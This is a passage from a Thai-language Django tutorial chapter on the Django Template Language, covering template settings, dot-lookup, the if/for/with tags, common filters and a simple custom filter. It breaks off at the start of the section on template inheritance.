# Part 008: Django Template Language เบื้องต้น

> **ขั้นตอนที่ 71-80 ของหลักสูตร** | Phase 1: รากฐาน Python & Django
>
> เป้าหมายของ Part นี้: เข้าใจ **Django Template Language (DTL)** ตั้งแต่การตั้งค่า
> `TEMPLATES` ใน `settings.py`, ตัวแปร `{{ }}`, tags `{% %}` (if, for, with),
> filters ที่ใช้บ่อยที่สุด, Template Inheritance ด้วย `extends`/`block`,
> การแยก partial ด้วย `include`, การใช้ static files ใน template, การป้องกัน XSS
> ด้วยระบบ auto-escaping, และ Context Processors เบื้องต้น เมื่อจบ Part นี้ คุณจะมี
> `base.html` ที่เป็นโครงหลักของทั้งเว็บไซต์ พร้อมหน้า `blog/list.html` และ
> `blog/detail.html` ที่ extends จาก `base.html` จริง เชื่อมกับ view `post_list` และ
> `post_detail` ที่คุณสร้างไว้ใน Part 007

---

## สารบัญของ Part นี้

- ขั้นตอนที่ 71: Template Engine คืออะไร, การตั้งค่า `TEMPLATES` ใน `settings.py`, ความหมายของ `APP_DIRS` และ `DIRS`
- ขั้นตอนที่ 72: Variables `{{ }}` และลำดับการค้นหาค่าแบบ dot-lookup (dictionary → attribute → list index → method call)
- ขั้นตอนที่ 73: Tags `{% %}`: `if/elif/else/endif`, `for/empty/endfor`, `with`
- ขั้นตอนที่ 74: Filters ที่ใช้บ่อย: `date`, `default`, `length`, `truncatewords`, `safe`, `escape`, `linebreaks` พร้อมเกริ่น Custom Filter
- ขั้นตอนที่ 75: Template Inheritance: `{% extends %}` และ `{% block %}` (สร้าง `base.html` จริง)
- ขั้นตอนที่ 76: `{% include %}` สำหรับแยก Partial Template (เช่น navbar, footer)
- ขั้นตอนที่ 77: Static Files ใน Template: `{% load static %}` และ `{% static %}`
- ขั้นตอนที่ 78: Auto-Escaping และการป้องกัน XSS, `{% csrf_token %}`, Comments `{# #}`
- ขั้นตอนที่ 79: Context Processors เบื้องต้น (`request`, `user` เข้ามาใน template ได้อย่างไร)
- ขั้นตอนที่ 80: สรุปและแบบฝึกหัด — สร้าง `base.html`, `blog/list.html`, `blog/detail.html` เชื่อมกับ View จริง

---

## ขั้นตอนที่ 71: Template Engine คืออะไร, การตั้งค่า `TEMPLATES`, `APP_DIRS` และ `DIRS`

### 71.1 ทบทวนตำแหน่งของ Template ใน MTV

ย้อนกลับไปที่แผนภาพ MTV ใน Part 001: **Template** คือตัว `T` ที่รับผิดชอบ "การแสดงผล"
ทั้งหมด เมื่อ View เรียก `render(request, 'blog/list.html', context)` สิ่งที่เกิดขึ้น
เบื้องหลังคือ:

```
render(request, template_name, context)
        │
        ▼
1. Django มองหาไฟล์ template ตามชื่อที่ระบุ (ผ่าน Template Engine)
        │
        ▼
2. Engine โหลดไฟล์ .html นั้นมาเป็น "Template object"
        │
        ▼
3. Engine นำ context (dict ของตัวแปร) มา "แทนที่" ทุกจุดที่มี {{ }} และ {% %}
        │
        ▼
4. ได้ HTML string ล้วน ๆ ออกมา (ไม่มี Django syntax หลงเหลือ)
        │
        ▼
5. render() ห่อ string นั้นด้วย HttpResponse ส่งกลับเบราว์เซอร์
```

**Template Engine** คือตัวโปรแกรมที่ทำหน้าที่ขั้นตอน 1-4 นี้ Django มาพร้อม engine
ของตัวเองชื่อ **Django Template Language (DTL)** ซึ่งเป็นสิ่งที่ Part นี้ทั้งหมดจะเรียนรู้

### 71.2 เปิดดู `TEMPLATES` ใน `config/settings.py`

ทุกโปรเจกต์ Django ที่สร้างด้วย `django-admin startproject` (ที่คุณทำใน Part 004)
จะมีตัวแปร `TEMPLATES` มาให้อัตโนมัติแล้วในไฟล์ `config/settings.py`:

```python
# config/settings.py
TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'DIRS': [],
        'APP_DIRS': True,
        'OPTIONS': {
            'context_processors': [
                'django.template.context_processors.debug',
                'django.template.context_processors.request',
                'django.contrib.auth.context_processors.auth',
                'django.contrib.messages.context_processors.messages',
            ],
        },
    },
]
```

`TEMPLATES` เป็น **list ของ dict** เพราะ Django รองรับหลาย engine พร้อมกันได้ในโปรเจกต์
เดียว (เช่น ใช้ DTL คู่กับ Jinja2) แต่ 99% ของโปรเจกต์ Django ใช้ engine เดียวคือ
`DjangoTemplates` ตามค่าเริ่มต้นนี้ตลอดทั้งหลักสูตร

### 71.3 ความหมายของแต่ละ key ใน `TEMPLATES`

| Key | ความหมาย |
|---|---|
| `BACKEND` | ระบุ engine ที่จะใช้ — `django.template.backends.django.DjangoTemplates` คือ DTL (ค่าเริ่มต้น) หรือ `django.template.backends.jinja2.Jinja2` สำหรับ Jinja2 |
| `DIRS` | list ของ path ที่จะให้ Django ค้นหา template แบบ **ระดับโปรเจกต์** (ไม่ผูกกับแอปใดแอปหนึ่ง) — อธิบายละเอียดในขั้นตอนที่ 71.5 |
| `APP_DIRS` | `True`/`False` — ถ้า `True` Django จะค้นหา template ในโฟลเดอร์ `templates/` ของ**ทุกแอปที่อยู่ใน `INSTALLED_APPS`**โดยอัตโนมัติ |
| `OPTIONS` | ตัวเลือกเพิ่มเติมของ engine เช่น `context_processors` (ขั้นตอนที่ 79), `debug`, `string_if_invalid` |

### 71.4 `APP_DIRS`: ทำไม Django หา template ของแอป `blog` เจอโดยไม่ต้องตั้งค่าเพิ่ม

เมื่อ `APP_DIRS = True` (ค่าเริ่มต้น) Django จะไล่ดูทุกแอปใน `INSTALLED_APPS`
ตามลำดับ แล้วมองหาโฟลเดอร์ชื่อ `templates/` ข้างในแอปนั้น ถ้าเจอ ก็จะรวมเข้าไปในลิสต์
ที่ใช้ค้นหา template ทั้งหมด

นี่คือเหตุผลที่ถ้าคุณสร้างไฟล์ไว้ที่:

```
blog/
└── templates/
    └── blog/
        └── list.html
```

แล้วเรียก `render(request, 'blog/list.html', ...)` ใน view Django จะหาไฟล์นี้เจอทันที
**โดยไม่ต้องตั้งค่าอะไรเพิ่มเลย** เพราะแอป `blog` อยู่ใน `INSTALLED_APPS` แล้วตั้งแต่
Part 005

> **สังเกตการซ้อนโฟลเดอร์ชื่อแอปอีกชั้น (`blog/templates/blog/list.html`)**: นี่ไม่ใช่
> ความผิดพลาด แต่เป็นธรรมเนียมที่ Django แนะนำอย่างเป็นทางการ เรียกว่า
> **App Namespacing** เหตุผลคือถ้าสองแอปต่างมีไฟล์ชื่อ `list.html` เหมือนกัน
> (เช่น `blog/templates/list.html` กับ `shop/templates/list.html`) Django จะสับสน
> ว่าจะใช้ไฟล์ไหนเมื่อค้นหาแบบ `APP_DIRS` (จะใช้ไฟล์แรกที่เจอตามลำดับ `INSTALLED_APPS`
> ซึ่งอาจไม่ใช่ไฟล์ที่คุณต้องการ) การซ้อนชื่อแอปอีกชั้นทำให้ path เต็มไม่มีวันชนกัน
> (`blog/list.html` ≠ `shop/list.html`) — เราพูดถึงเรื่องนี้สั้น ๆ ไปแล้วใน Part 005
> ข้อ 47.2 ตอนนี้คือเวลาที่คุณจะได้ลงมือทำจริง

### 71.5 `DIRS`: Template ระดับโปรเจกต์ที่ไม่ผูกกับแอปไหนเลย

บาง template ไม่ได้เป็นของแอปใดแอปหนึ่งโดยเฉพาะ เช่น `base.html` ที่เป็นโครงหลักของ
ทั้งเว็บไซต์ (ทุกแอปต้อง extends จากมัน) หรือหน้า error กำหนดเอง (`404.html`,
`500.html` — จะเรียนใน Part 006 ข้อ 58 ไปแล้ว และจะกลับมาเจาะลึกอีกครั้งใน Phase 10)
Template เหล่านี้ควรอยู่ที่ **root ของโปรเจกต์** ไม่ใช่ในแอปใดแอปหนึ่ง

สร้างโฟลเดอร์ `templates/` ที่ root แล้วบอก Django ให้รู้จักผ่าน `DIRS`:

```bash
mkdir templates
```

```python
# config/settings.py
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent.parent

TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'DIRS': [BASE_DIR / 'templates'],   # ← เพิ่มบรรทัดนี้
        'APP_DIRS': True,
        'OPTIONS': {
            'context_processors': [
                'django.template.context_processors.debug',
                'django.template.context_processors.request',
                'django.contrib.auth.context_processors.auth',
                'django.contrib.messages.context_processors.messages',
            ],
        },
    },
]
```

สังเกตว่าเราใช้ `BASE_DIR / 'templates'` (Python's `pathlib` รองรับ operator `/`
สำหรับต่อ path) แทนการเขียน string path ตรง ๆ ซึ่งเป็นวิธีที่ Django เขียนให้ตั้งแต่
`startproject` สำหรับตัวแปรอื่น ๆ เช่น `STATIC_URL` (จะเรียนเต็มใน Part 009)

โครงสร้างโปรเจกต์หลังเพิ่ม `templates/` จะเป็นดังนี้:

```
django-mastery-course/
├── venv/
├── manage.py
├── config/
│   ├── settings.py
│   └── urls.py
├── blog/
│   ├── models.py
│   ├── views.py
│   ├── urls.py
│   └── templates/
│       └── blog/
│           ├── list.html
│           └── detail.html
└── templates/              ← ใหม่: template ระดับโปรเจกต์
    ├── base.html
    └── partials/
        ├── navbar.html
        └── footer.html
```

### 71.6 ลำดับการค้นหา Template เมื่อมีชื่อซ้ำกัน

Django รวม path ทั้งหมดจาก `DIRS` และ `APP_DIRS` เข้าเป็นลิสต์เดียว แล้วค้นหาตาม
ลำดับนี้เสมอ:

| ลำดับ | แหล่งค้นหา | อธิบาย |
|---|---|---|
| 1 | ทุก path ใน `DIRS` (ตามลำดับที่ประกาศใน list) | ค้นหาก่อนเสมอ |
| 2 | โฟลเดอร์ `templates/` ของแต่ละแอปใน `INSTALLED_APPS` (ตามลำดับที่ประกาศ) | ค้นหาต่อถ้ายังไม่เจอใน `DIRS` |

Django หยุดค้นหาทันทีที่เจอไฟล์แรกที่ชื่อตรงกัน **กฎทองข้อเดิมจาก Part 006
(ลำดับสำคัญเสมอ)** ใช้ได้กับ template เช่นกัน — นี่คือเหตุผลที่ `DIRS` มาก่อน
`APP_DIRS` เสมอ: มันทำให้ template ระดับโปรเจกต์สามารถ **override** template ของ
แอปใดก็ได้ ถ้าจำเป็น (ใช้บ่อยเวลาต้องการเปลี่ยนหน้าตาแอป third-party เช่น
`django.contrib.admin` โดยไม่แก้โค้ดต้นทาง)

### 71.7 ทางเลือกอื่น: Jinja2 Backend (รู้จักไว้ ไม่ต้องใช้ตอนนี้)

Django รองรับ Jinja2 เป็นทางเลือกแทน DTL ได้ (นิยมในทีมที่มาจาก Flask หรือทีมที่
ต้องการความเร็วในการ render สูงกว่า) แต่หลักสูตรนี้จะใช้ **DTL ตลอดทั้งหลักสูตร**
เพราะ:

| ประเด็น | Django Template Language (DTL) | Jinja2 |
|---|---|---|
| Auto-escaping (ป้องกัน XSS) | เปิดโดยค่าเริ่มต้น | ต้องตั้งค่าเอง (ปิดโดย default ถ้าไม่ผ่าน Django's Jinja2 backend) |
| เขียน Python expression ใน template | ทำไม่ได้ (จงใจจำกัด — ดูเหตุผลข้อ 71.7) | ทำได้ (ยืดหยุ่นกว่าแต่เสี่ยง logic รั่วเข้า template) |
| ความเร็วในการ render | ปานกลาง | เร็วกว่า (คอมไพล์เป็น Python bytecode) |
| ผูกกับ Django ecosystem | แน่นมาก (context processors, template tags ของ 3rd-party app ส่วนใหญ่เขียนมาให้ DTL) | หลวมกว่า ต้องเขียน adapter เพิ่มสำหรับหลาย feature |
| แนะนำเมื่อ | โปรเจกต์ทั่วไป, ต้องการ security by default | โปรเจกต์ที่เน้น performance สูงมาก และทีมคุ้นเคย Jinja2 อยู่แล้ว |

DTL จงใจ **ไม่ให้เขียน Python expression เต็มรูปแบบ** ใน template (ไม่มี
`{{ 1 + 1 }}`, ไม่มี `{% import %}`) เพราะปรัชญาการออกแบบของ Django คือ
**"Template ไม่ควรมี business logic"** — logic ทั้งหมดควรอยู่ใน View หรือ Model
Template ทำหน้าที่แค่ "แสดงผล" เท่านั้น หลักการนี้จะปรากฏซ้ำ ๆ ตลอดทั้ง Part นี้

---

## ขั้นตอนที่ 72: Variables `{{ }}` และลำดับการค้นหาค่าแบบ Dot-Lookup

### 72.1 ไวยากรณ์พื้นฐานของ Variable

ตัวแปรใน DTL เขียนด้วยเครื่องหมายปีกกาคู่:

```html
{{ variable_name }}
```

เมื่อ Django render จะแทนที่ `{{ variable_name }}` ด้วยค่าจริงของตัวแปรนั้นจาก
**context** (dict ที่ view ส่งเข้ามาตอนเรียก `render()`) เช่น:

```python
# view
return render(request, 'blog/detail.html', {'post': post})
```

```html
<!-- template -->
<h1>{{ post.title }}</h1>
```

ถ้า `post.title` คือ `"Django คืออะไร"` ผลลัพธ์ HTML ที่ได้คือ `<h1>Django คืออะไร</h1>`

### 72.2 จุด (`.`) คือตัวเข้าถึงข้อมูลตัวเดียวที่ DTL มี

จุดสำคัญที่สุดของ DTL คือ: **ไม่มีวงเล็บ ไม่มี bracket `[]` ในการเข้าถึงข้อมูล**
DTL ใช้แค่ **จุด (`.`)** สำหรับทุกกรณี ไม่ว่าจะเป็น attribute, dict key, index หรือ
เรียก method — นี่คือความแตกต่างที่ใหญ่ที่สุดเมื่อเทียบกับการเขียน Python ปกติ

```python
# Python ปกติ — ใช้ syntax ต่างกันตามชนิดข้อมูล
post.title          # attribute lookup
data['title']        # dict lookup
items[0]             # index lookup
post.get_absolute_url()   # method call
```

```html
<!-- DTL — ใช้ syntax เดียวกันหมด (จุด) -->
{{ post.title }}
{{ data.title }}
{{ items.0 }}
{{ post.get_absolute_url }}
```

### 72.3 ลำดับการค้นหาเบื้องหลัง (Dot-Lookup Resolution Order)

เมื่อ DTL เจอ `{{ post.title }}` มันไม่รู้ล่วงหน้าว่า `post` เป็น object ธรรมดา, dict,
หรือ list จึงต้อง **ลองค้นหาไปตามลำดับที่กำหนดไว้ตายตัว** ทันทีที่ลองแบบใดแล้ว
**สำเร็จ** ก็จะหยุดและใช้ผลลัพธ์นั้น โดยไล่ตามลำดับนี้:

| ลำดับ | วิธีค้นหา | เงื่อนไขที่ลองสำเร็จ | ตัวอย่าง |
|---|---|---|---|
| 1 | **Dictionary lookup** | `post` เป็น dict และมี key ชื่อ `title` | `post['title']` |
| 2 | **Attribute lookup** | `post` เป็น object และมี attribute ชื่อ `title` | `post.title` |
| 3 | **Method call** | `post` มี method ชื่อ `title` (ไม่รับ argument บังคับ และไม่ raise exception) | `post.title()` — เรียกอัตโนมัติ ไม่ต้องใส่วงเล็บใน template |
| 4 | **List-index lookup** | `post` เป็น list/tuple และ `title` แปลงเป็นจำนวนเต็มได้ | `post[title]` (เช่น `items.0` → `items[0]`) |

ถ้าลองครบทุกวิธีแล้วยังไม่สำเร็จ DTL จะคืนค่าเป็น**สตริงว่าง** (ค่าเริ่มต้นของ
`TEMPLATES.OPTIONS.string_if_invalid`) โดย**ไม่ raise exception ใด ๆ** — นี่คือความ
ตั้งใจของ Django เพื่อไม่ให้หน้าเว็บทั้งหน้าพังเพราะพิมพ์ชื่อตัวแปรผิดจุดเดียว
(ต่างจากภาษาโปรแกรมมิ่งทั่วไปที่มักจะ error ทันที)

### 72.4 ตัวอย่างจริงกับ Post Model

ทบทวนจาก Part 007: แอป `blog` มี model `Post` ที่ประกอบด้วยฟิลด์ `title`, `slug`,
`content`, `created_at`, `updated_at`, `is_published` (จะเรียนรายละเอียดชนิดฟิลด์
ทั้งหมดเชิงลึกใน Part 011-016 แต่ตอนนี้เราใช้มันเพื่อฝึก Template ได้เลย):

```python
# blog/models.py (ทบทวนจาก Part 007)
from django.db import models
from django.urls import reverse


class Post(models.Model):
    title = models.CharField(max_length=200)
    slug = models.SlugField(max_length=220, unique=True)
    content = models.TextField()
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)
    is_published = models.BooleanField(default=True)

    class Meta:
        ordering = ['-created_at']

    def __str__(self):
        return self.title

    def get_absolute_url(self):
        return reverse('blog:detail', kwargs={'slug': self.slug})
```

ในเทมเพลต เมื่อ context มี `post` เป็น instance ของ `Post` การเข้าถึงแต่ละแบบจะ
ทำงานด้วยกลไก dot-lookup ดังนี้:

```html
{{ post.title }}              <!-- (2) Attribute lookup: post.title -->
{{ post.created_at }}         <!-- (2) Attribute lookup: post.created_at -->
{{ post.get_absolute_url }}   <!-- (3) Method call: post.get_absolute_url() -->
{{ post.is_published }}       <!-- (2) Attribute lookup: True/False -->
```

ถ้า context เป็น dict ธรรมดาแทน (เช่นตอนทดสอบไอเดียเร็ว ๆ โดยยังไม่มี model):

```python
context = {'stats': {'total_posts': 12, 'total_views': 4500}}
```

```html
{{ stats.total_posts }}   <!-- (1) Dictionary lookup: stats['total_posts'] -->
```

และถ้าเป็น list:

```python
context = {'tags': ['django', 'python', 'web']}
```

```html
{{ tags.0 }}   <!-- (4) List-index lookup: tags[0] → 'django' -->
```

### 72.5 ข้อจำกัดสำคัญ: ห้ามส่ง Argument เข้า Method ใน Template

เพราะ DTL เรียก method โดยไม่มีวงเล็บและไม่มีที่ให้ใส่ argument ดังนั้น **method ที่จะ
เรียกจาก template ได้ ต้องไม่บังคับรับ argument เพิ่ม** (นอกจาก `self`) เช่น
`post.get_absolute_url()` ใช้ได้เพราะไม่รับ argument แต่ถ้ามี method แบบ
`post.get_summary(length)` ที่บังคับต้องใส่ `length` จะเรียกจาก template ไม่ได้เลย
ต้องเตรียมค่าที่ต้องการล่วงหน้าใน View แล้วส่งเป็นตัวแปรแยกเข้า context แทน

### 72.6 การเข้าถึงตัวแปรที่ไม่มีอยู่จริง

```html
{{ post.nonexistent_field }}   <!-- ได้สตริงว่าง ไม่ error -->
{{ undefined_variable }}       <!-- ได้สตริงว่าง ไม่ error -->
```

พฤติกรรม "เงียบ ไม่ error" นี้มีทั้งข้อดีและข้อเสีย: ข้อดีคือหน้าเว็บไม่พังทั้งหน้า
เพราะตัวแปรเดียวผิด แต่ข้อเสียคือ **บั๊กจากการพิมพ์ชื่อตัวแปรผิดจะเงียบและตรวจจับยาก**
(เช่นพิมพ์ `{{ post.titel }}` ผิด จะไม่เห็น error ใด ๆ เพียงแค่เห็นช่องว่างในหน้าเว็บ)
เมื่อถึง Phase 7 (Testing) เราจะเรียนวิธีเขียนเทสต์ที่ครอบคลุมเนื้อหาของหน้าเว็บ
เพื่อจับบั๊กประเภทนี้ตั้งแต่เนิ่น ๆ

---

## ขั้นตอนที่ 73: Tags `{% %}`: `if/elif/else/endif`, `for/empty/endfor`, `with`

### 73.1 ความแตกต่างระหว่าง Variable (`{{ }}`) กับ Tag (`{% %}`)

| | Variable `{{ }}` | Tag `{% %}` |
|---|---|---|
| หน้าที่ | **แสดงผล** ค่าของตัวแปร | **ควบคุมตรรกะ** การ render (เงื่อนไข, การวนซ้ำ, การโหลด library) |
| คืนค่าเป็นข้อความเสมอไหม | ใช่ | ไม่เสมอไป — บาง tag ไม่แสดงอะไรเลย (เช่น `{% load %}`) |
| ตัวอย่าง | `{{ post.title }}` | `{% if post.is_published %} ... {% endif %}` |

### 73.2 `{% if %}` `{% elif %}` `{% else %}` `{% endif %}`

```html
{% if post.is_published %}
    <span class="badge badge--published">เผยแพร่แล้ว</span>
{% elif post.created_at %}
    <span class="badge badge--draft">ฉบับร่าง</span>
{% else %}
    <span class="badge badge--unknown">ไม่ทราบสถานะ</span>
{% endif %}
```

`{% if %}` รองรับ operator เปรียบเทียบและตรรกะที่จำเป็นครบถ้วน:

| Operator | ความหมาย | ตัวอย่าง |
|---|---|---|
| `==`, `!=` | เท่ากับ, ไม่เท่ากับ | `{% if post.is_published == True %}` |
| `<`, `>`, `<=`, `>=` | เปรียบเทียบค่า | `{% if posts|length > 0 %}` |
| `and`, `or`, `not` | ตรรกะ | `{% if post.is_published and not post.is_deleted %}` |
| `in`, `not in` | ตรวจสอบสมาชิกใน collection | `{% if 'django' in post.title %}` |
| `is`, `is not` | เปรียบเทียบ identity (มักใช้กับ `None`) | `{% if post.updated_at is not None %}` |

> **ข้อควรระวัง**: `{% if %}` ของ DTL **ไม่รองรับการเรียงเงื่อนไขต่อกันเกิน 1
> operator ต่อครั้งโดยไม่มีวงเล็บ** เช่น `{% if a > b > c %}` ใช้ไม่ได้ ต้องเขียนแยก
> ด้วย `and`: `{% if a > b and b > c %}` และไม่รองรับการผสม `and`/`or`
> ในนิพจน์เดียวกันโดยไม่มีการจัดกลุ่มด้วย tag ย่อย (DTL ไม่มีวงเล็บทางคณิตศาสตร์
> ในนิพจน์ tag) หากเงื่อนไขซับซ้อนมาก ควรคำนวณผลลัพธ์เป็น boolean เดียวใน View
> แล้วส่งเข้า context แทน — สอดคล้องกับหลักการ "template ไม่ควรมี logic ซับซ้อน"
> ที่กล่าวถึงในขั้นตอนที่ 71.7

### 73.3 `{% for %}` `{% empty %}` `{% endfor %}`

```html
<ul>
{% for post in posts %}
    <li>{{ post.title }}</li>
{% empty %}
    <li>ยังไม่มีบทความในขณะนี้</li>
{% endfor %}
</ul>
```

`{% empty %}` เป็น block ทางเลือกที่จะแสดงผล **ก็ต่อเมื่อ** ตัว list/queryset ที่วนซ้ำ
ว่างเปล่า (ความยาวเป็น 0) ซึ่งสะดวกกว่าการเขียน `{% if %}` ครอบ `{% for %}` แยกต่างหาก

### 73.4 ตัวแปรพิเศษ `forloop` ภายใน `{% for %}`

Django มอบตัวแปรพิเศษชื่อ `forloop` ให้ใช้ภายใน block ของ `{% for %}` เสมอ:

| ตัวแปร | ความหมาย |
|---|---|
| `forloop.counter` | ลำดับรอบปัจจุบัน เริ่มนับที่ **1** |
| `forloop.counter0` | ลำดับรอบปัจจุบัน เริ่มนับที่ **0** |
| `forloop.revcounter` | ลำดับนับถอยหลัง สิ้นสุดที่ 1 |
| `forloop.revcounter0` | ลำดับนับถอยหลัง สิ้นสุดที่ 0 |
| `forloop.first` | `True` ถ้าเป็นรอบแรก |
| `forloop.last` | `True` ถ้าเป็นรอบสุดท้าย |
| `forloop.parentloop` | อ้างอิงกลับไปยัง `forloop` ของ loop ชั้นนอก (กรณี nested loop) |

ตัวอย่างการใช้งานจริง — ใส่เลขลำดับหน้าบทความ และใส่เส้นคั่นยกเว้นรายการสุดท้าย:

```html
<ol>
{% for post in posts %}
    <li>
        บทความที่ {{ forloop.counter }}: {{ post.title }}
        {% if not forloop.last %}<hr>{% endif %}
    </li>
{% endfor %}
</ol>
```

### 73.5 `{% with %}`: ตั้งชื่อย่อให้ค่าที่คำนวณซับซ้อนหรือเรียกซ้ำหลายครั้ง

`{% with %}` ใช้ตั้ง**ตัวแปรชั่วคราว** ที่มีขอบเขตเฉพาะภายใน block ของมันเท่านั้น
มีประโยชน์ 2 กรณีหลัก: (1) หลีกเลี่ยงการเขียน dot-lookup ยาว ๆ ซ้ำหลายรอบ และ
(2) หลีกเลี่ยงการ query ฐานข้อมูลซ้ำโดยไม่ตั้งใจ (จะเข้าใจเหตุผลเต็มเมื่อเรียน ORM
เชิงลึกใน Phase 2 แต่หลักการคร่าว ๆ คือ dot-lookup ที่เรียก method หรือ related
manager ซ้ำหลายจุดในหน้าเดียว อาจ trigger query ซ้ำหลายครั้งโดยไม่จำเป็น):

```html
{% with title=post.title|truncatewords:10 %}
    <h2>{{ title }}</h2>
    <meta property="og:title" content="{{ title }}">
{% endwith %}
```

ไวยากรณ์ `{% with var1=value1 var2=value2 %}` รองรับการตั้งหลายตัวแปรพร้อมกันได้
ในบรรทัดเดียว ก่อน `{% endwith %}` ตัวแปรเหล่านี้จะหายไปทันที ไม่รั่วไหลไปยังส่วนอื่น
ของ template

---

## ขั้นตอนที่ 74: Filters ที่ใช้บ่อย และเกริ่น Custom Filter

### 74.1 ไวยากรณ์ของ Filter

Filter คือฟังก์ชันที่แปลงค่าของตัวแปรก่อนแสดงผล เขียนต่อท้ายตัวแปรด้วยเครื่องหมาย
pipe (`|`):

```html
{{ value|filter_name }}
{{ value|filter_name:argument }}
```

Filter สามารถ **ต่อกันเป็นสาย (chain)** ได้ไม่จำกัด โดย Django จะประมวลผลจากซ้ายไป
ขวาตามลำดับ:

```html
{{ post.content|truncatewords:20|escape }}
<!-- ขั้นที่ 1: ตัดให้เหลือ 20 คำ -->
<!-- ขั้นที่ 2: escape ผลลัพธ์ที่ได้ -->
```

### 74.2 ตาราง Filter ที่ใช้บ่อยที่สุด

| Filter | หน้าที่ | ตัวอย่าง | ผลลัพธ์ (สมมติ) |
|---|---|---|---|
| `date` | จัดรูปแบบวันที่/เวลา | `{{ post.created_at\|date:"d F Y" }}` | `26 กันยายน 2026` |
| `default` | ใช้ค่าสำรองถ้าตัวแปรเป็นค่า falsy (`""`, `None`, `0`, `False`) | `{{ post.subtitle\|default:"ไม่มีคำโปรย" }}` | `ไม่มีคำโปรย` |
| `default_if_none` | เหมือน `default` แต่ตรวจเฉพาะ `None` เท่านั้น (ไม่ครอบคลุม `""` หรือ `0`) | `{{ post.views\|default_if_none:"0" }}` | `0` |
| `length` | นับความยาว (string, list, queryset) | `{{ posts\|length }}` | `12` |
| `truncatewords` | ตัดข้อความให้เหลือ N คำ แล้วเติม `...` | `{{ post.content\|truncatewords:15 }}` | `Django คือเฟรมเวิร์กเว็บ...` |
| `truncatechars` | ตัดข้อความให้เหลือ N ตัวอักษร | `{{ post.title\|truncatechars:20 }}` | `Django Template Lan…` |
| `safe` | บอก Django ว่า string นี้ปลอดภัย ไม่ต้อง auto-escape | `{{ post.content_html\|safe }}` | (แสดง HTML tag จริง — ดูคำเตือนในขั้นตอนที่ 78) |
| `escape` | บังคับ escape อักขระ HTML พิเศษ (ปกติทำอัตโนมัติอยู่แล้ว — ใช้เมื่อ auto-escape ถูกปิดไว้) | `{{ user_comment\|escape }}` | `&lt;script&gt;` แทน `<script>` |
| `linebreaks` | แปลง newline (`\n`) ในข้อความเป็น `<p>`/`<br>` | `{{ post.content\|linebreaks }}` | ห่อแต่ละย่อหน้าด้วย `<p>...</p>` |
| `linebreaksbr` | แปลง newline เป็น `<br>` เท่านั้น (ไม่ห่อ `<p>`) | `{{ post.content\|linebreaksbr }}` | แทรก `<br>` ระหว่างบรรทัด |
| `lower` / `upper` | แปลงตัวพิมพ์เล็ก/ใหญ่ (มีผลกับอักษรละตินเท่านั้น) | `{{ "Django"\|lower }}` | `django` |
| `title` | ทำให้อักษรแรกของแต่ละคำเป็นตัวใหญ่ | `{{ "django template language"\|title }}` | `Django Template Language` |
| `pluralize` | เติม `s` (หรือคำที่กำหนด) ถ้าจำนวน ≠ 1 | `{{ posts\|length }} post{{ posts\|length\|pluralize }}` | `3 posts` |
| `join` | เชื่อม list ด้วยตัวคั่น | `{{ tags\|join:", " }}` | `django, python, web` |
| `wordcount` | นับจำนวนคำ | `{{ post.content\|wordcount }}` | `142` |
| `yesno` | แปลง boolean เป็นข้อความ | `{{ post.is_published\|yesno:"เผยแพร่แล้ว,ฉบับร่าง" }}` | `เผยแพร่แล้ว` |

### 74.3 ตัวอย่าง `date` filter แบบละเอียด (ใช้บ่อยที่สุดในโปรเจกต์จริง)

```html
{{ post.created_at|date:"d/m/Y" }}          <!-- 26/09/2026 -->
{{ post.created_at|date:"D, d M Y" }}       <!-- Sat, 26 Sep 2026 -->
{{ post.created_at|date:"H:i" }}            <!-- 14:30 -->
{{ post.created_at|date:"d F Y H:i" }}      <!-- 26 September 2026 14:30 -->
{{ post.created_at|date }}                  <!-- ใช้ format เริ่มต้นจาก settings DATE_FORMAT -->
```

รูปแบบตัวอักษรของ `date` filter อ้างอิงตาราง format ของ PHP's `date()` ที่ Django
นำมาปรับใช้ (ไม่ใช่ Python's `strftime` โดยตรง) ตารางย่อที่ใช้บ่อย:

| อักษร | ความหมาย | ตัวอย่าง |
|---|---|---|
| `d` | วันที่ 2 หลัก | `26` |
| `D` | ชื่อวันแบบย่อ | `Sat` |
| `m` | เดือน 2 หลัก | `09` |
| `M` | ชื่อเดือนแบบย่อ | `Sep` |
| `F` | ชื่อเดือนแบบเต็ม | `September` |
| `Y` | ปี 4 หลัก | `2026` |
| `H` | ชั่วโมงแบบ 24 ชม. | `14` |
| `i` | นาที | `30` |

### 74.4 การ Chain Filter หลายตัว: ตัวอย่างจริงจาก Blog

```html
<p class="excerpt">
    {{ post.content|truncatewords:25|linebreaksbr }}
</p>
<time datetime="{{ post.created_at|date:'c' }}">
    เผยแพร่เมื่อ {{ post.created_at|date:"d F Y" }}
</time>
```

### 74.5 เกริ่น Custom Filter: เมื่อ Filter มาตรฐานไม่พอ

ถ้าวันหนึ่งคุณต้องการ filter ที่ Django ไม่มีมาให้ เช่น `{{ post.content|reading_time }}`
ที่คำนวณเวลาอ่านโดยประมาณจากจำนวนคำ คุณสามารถสร้าง**custom template filter**ของ
ตัวเองได้ ด้วยการสร้างโฟลเดอร์ `templatetags/` ในแอป แล้วใช้ `@register.filter`:

```python
# blog/templatetags/blog_extras.py (ตัวอย่างคร่าว ๆ — จะเจาะลึกเต็มรูปแบบใน Part 029)
from django import template

register = template.Library()


@register.filter
def reading_time(content):
    words = len(content.split())
    minutes = max(1, round(words / 200))  # สมมติอ่านเฉลี่ย 200 คำ/นาที
    return f"{minutes} นาที"
```

```html
<!-- ใช้งานใน template -->
{% load blog_extras %}
<p>ใช้เวลาอ่านประมาณ {{ post.content|reading_time }}</p>
```

**Custom filter คือฟังก์ชัน Python ธรรมดา** ที่รับค่าเข้า 1-2 ตัว (ค่าตั้งต้น +
argument ถ้ามี) แล้วคืนค่าที่จะแสดงผล เราจะเจาะลึกเรื่องนี้แบบเต็มรูปแบบ — รวมถึง
**Custom Template Tags** ทั้งแบบ simple tag, inclusion tag และ assignment tag —
ใน **Part 029** เมื่อคุณมีพื้นฐาน DTL ครบถ้วนจาก Part นี้แล้ว

---

## ขั้นตอนที่ 75: Template Inheritance ด้วย `{% extends %}` และ `{% block %}`

### 75.1 ปัญหาของการเขียน HTML ซ้ำทุกหน้า

